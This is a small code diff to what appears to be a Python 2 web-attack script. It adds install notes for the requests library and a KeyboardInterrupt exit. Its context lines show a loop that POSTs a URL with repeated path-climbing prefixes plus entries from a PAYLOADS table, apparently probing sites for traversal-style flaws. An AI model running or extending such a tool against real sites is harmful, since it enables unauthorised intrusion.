@@ -11,6 +11,10 @@ Dependencies:
     * python2
         # Debian/Ubuntu: apt-get install python
         # Fedora: dnf install python
+
+    * requests
+        # Debian/Ubuntu: apt-get install python-requests
+        # Fedora: dnf install python2-requests
 '''
 
 PAYLOADS = {
@@ -57,6 +61,8 @@ if bool(URLS):
             for i in xrange(20):
                 try:
                     response = requests.post(url + (i * UP) + payload, timeout=3)
+                except KeyboardInterrupt:
+                    sys.exit(0)    
                 except:
                     pass
 
